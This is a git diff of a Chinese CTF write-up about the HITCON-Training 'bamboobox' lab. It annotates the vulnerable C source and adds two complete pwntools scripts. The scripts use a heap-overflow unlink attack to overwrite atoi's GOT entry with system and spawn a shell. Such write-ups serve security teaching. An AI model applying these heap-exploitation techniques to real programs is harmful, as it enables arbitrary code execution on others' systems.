@@ -1,7 +1,7 @@
 ---
 layout: post
-title: bamboobox house of force
-excerpt: "house of force"
+title: bamboobox house of force and unlink
+excerpt: "house of force and unlink"
 categories: [Writeup]
 comments: true
 ---
@@ -54,11 +54,11 @@ void menu(){								//就是一堆介绍
 
 void show_item(){
 	int i ;
-	if(!num){
+	if(!num){		//num = 0
 		puts("No item in the box");		
 	}else{
 		for(i = 0 ; i < 100; i++){
-			if(itemlist[i].name){
+			if(itemlist[i].name){				// 遍历找到name不为空的,然后打印
 				printf("%d : %s",i,itemlist[i].name);
 			}
 		}
@@ -83,7 +83,7 @@ int add_item(){
 		for(i = 0 ; i < 100 ; i++){
 			if(!itemlist[i].name){			//遍历找到name为空的位置
 				itemlist[i].size = length ;
-				itemlist[i].name = (char*)malloc(length);
+				itemlist[i].name = (char*)malloc(length);	//根据输入的长度进行malloc
 				printf("Please enter the name of item:");
 				size = read(0,itemlist[i].name,length);		//申请相应长度,写入,然后末尾\x00
 				itemlist[i].name[size] = '\x00';
@@ -114,10 +114,10 @@ void change_item(){
 		printf("Please enter the index of item:");
 		read(0,indexbuf,8);
 		index = atoi(indexbuf);
-		if(itemlist[index].name){
+		if(itemlist[index].name){	//如果这个item存在
 			printf("Please enter the length of item name:");
 			read(0,lengthbuf,8);
-			length = atoi(lengthbuf);		//存在的话就重新输入长度,写入
+			length = atoi(lengthbuf);		//重新输入长度,写入
 			printf("Please enter the new name of the item:");
 			readsize = read(0,itemlist[index].name,length);	// 这里存在明显的堆溢出
 			*(itemlist[index].name + readsize) = '\x00';
@@ -138,7 +138,7 @@ void remove_item(){
 	}else{
 		printf("Please enter the index of item:");
 		read(0,indexbuf,8);
-		index = atoi(indexbuf);
+		index = atoi(indexbuf);		//输入remove的序号
 		if(itemlist[index].name){
 			free(itemlist[index].name);		//如果存在就free掉这个
 			itemlist[index].name = 0 ;
@@ -210,6 +210,7 @@ int main(){
 3. 然后修改之
 
 最终的exp
+
 ```
 from pwn import *
 sh=process('./bamboobox')
@@ -256,6 +257,7 @@ sh.sendline('5')				#触发
 sh.interactive()
 ```
 最终的运行结果
+
 ```
  H localhost.localdomain  root  ~ | HITCON-Training | LAB | lab11  python exp.py 
 [+] Starting local process './bamboobox': pid 14235
@@ -277,5 +279,144 @@ Bamboobox Menu
 5.exit
 ----------------------------
 Your choice:this is mortyflag@@
+```
+
+#### 另一种unlink解法
+
+最终的exp
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+r = process('./bamboobox') 
+
+def additem(length,name):
+    r.recvuntil(":")
+    r.sendline("2")
+    r.recvuntil(":")
+    r.sendline(str(length))
+    r.recvuntil(":")
+    r.sendline(name)
+
+def modify(idx,length,name):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+    r.recvuntil(":")
+    r.sendline(str(length))
+    r.recvuntil(":")
+    r.sendline(name)
+
+def remove(idx):
+    r.recvuntil(":")
+    r.sendline("4")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+def show():
+    r.recvuntil(":")
+    r.sendline("1")
+
+additem(0x40,"a"*8)
+additem(0x80,"b"*8)
+additem(0x40,"c"*8)
+ptr = 0x6020c8					
+fake_chunk = p64(0) #prev_size		fake_chunk
+fake_chunk += p64(0x41) #size
+fake_chunk += p64(ptr-0x18) #fd
+fake_chunk += p64(ptr-0x10) #bk
+fake_chunk += "c"*0x20
+
+
+fake_chunk += p64(0x40)		#覆盖到下一个chunk
+fake_chunk += p64(0x90)
+modify(0,0x80,fake_chunk)		
+remove(1)					#触发unlink
+
+
+payload = p64(0)*2
+payload += p64(0x40) + p64(0x602068)
+modify(0,0x80,payload)
+show()
+r.recvuntil("0 : ")
+atoi = u64(r.recvuntil(":")[:6].ljust(8,"\x00"))
+libc = atoi - 0x378f0
+print "libc:",hex(libc)
+system = libc + 0x432c0
+modify(0,0x8,p64(system))
+r.recvuntil(":")
+r.sendline("sh")
+r.interactive()
+```
+
+```
+#coding=utf-8
+from pwn import *
+
+def add(r,length,name):
+    r.recvuntil('Your choice:')
+    r.sendline('2')
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(length)
+    r.recvuntil('Please enter the name of item:')
+    r.sendline(name)
+
+def show(r):
+    r.recvuntil('Your choice:')
+    r.sendline('1')
+
+
+
+def change(r,index,length,name):
+    r.recvuntil('Your choice:')
+    r.sendline('3')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(index)
+    r.recvuntil('Please enter the length of item name:')
+    r.sendline(length)
+    r.recvuntil('Please enter the new name of the item:')
+    r.sendline(name)
+
+
+def remove(r,index):
+    r.recvuntil('Your choice:')
+    r.sendline('4')
+    r.recvuntil('Please enter the index of item:')
+    r.sendline(index)
+
+if __name__ =='__main__':
+    r = process('./bamboobox')
+#  magic            0x400d49
+#  goodbye          0x4008b1
+#  item[0].name     0x6020c8
+    ptr = 0x6020c8      # 这个就是item[0].name的位置
+    add(r,'64','aaaa') #0x40
+    add(r,'128','bbbb')#0x80
+    add(r,'64','cccc')
+    fake_chunk = p64(0)  # prev_size		fake_chunk 40byte
+    fake_chunk += p64(0x41)  # size
+    fake_chunk += p64(ptr - 0x18)  # fd
+    fake_chunk += p64(ptr - 0x10)  # bk
+    fake_chunk += "a"*0x20
+
+    fake_chunk += p64(0x40)+p64(0x90)       #覆盖使前一个chunk也是40byte
+
+    change(r,'0','128',fake_chunk)
+    remove(r,'1')                           #触发 unlink操作
+
+    payload = p64(0) * 2+ p64(0x40) + p64(0x602068)  # 这个地址是atoi_got位置
+    change(r,'0', '128', payload)
+    show(r)
+    r.recvuntil("0 : ")
+    atoi = u64(r.recvuntil(":")[:6].ljust(8, "\x00"))
+    libc = atoi - 0x378f0
+    print "libc:", hex(libc)
+    system = libc + 0x432c0
+    change(r,'0', '8', p64(system))
+    r.recvuntil(":")
+    r.sendline("sh")
+    r.interactive()
 
 ```
